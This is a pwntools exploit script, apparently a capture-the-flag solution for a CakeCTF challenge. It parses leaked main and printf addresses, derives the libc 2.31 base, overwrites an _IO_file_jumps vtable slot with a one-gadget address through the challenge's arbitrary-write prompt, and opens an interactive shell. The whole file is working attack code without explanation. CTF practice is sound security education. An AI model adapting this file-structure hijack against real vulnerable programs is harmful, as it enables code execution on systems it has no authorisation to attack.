from pwn import *
context.binary = elf = ELF('./chall', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)

s = remote('pwn.cakectf.com', 9003)

s.recvuntil(b'<main> = ')
main = int(s.recvline()[:-1], 16)
s.recvuntil(b'<printf> = ')
printf = int(s.recvline()[:-1], 16)

libc.address = printf - libc.symbols.printf
print('libc_base:', hex(libc.address))

s.recvuntil(b'address: ')
s.sendline(hex(libc.symbols._IO_file_jumps + 0x38))
s.recvuntil(b'value: ')
s.sendline(hex(libc.address+0xe6c7e))
s.recvuntil(b'data: ')
s.sendline(b'\0')

s.interactive()
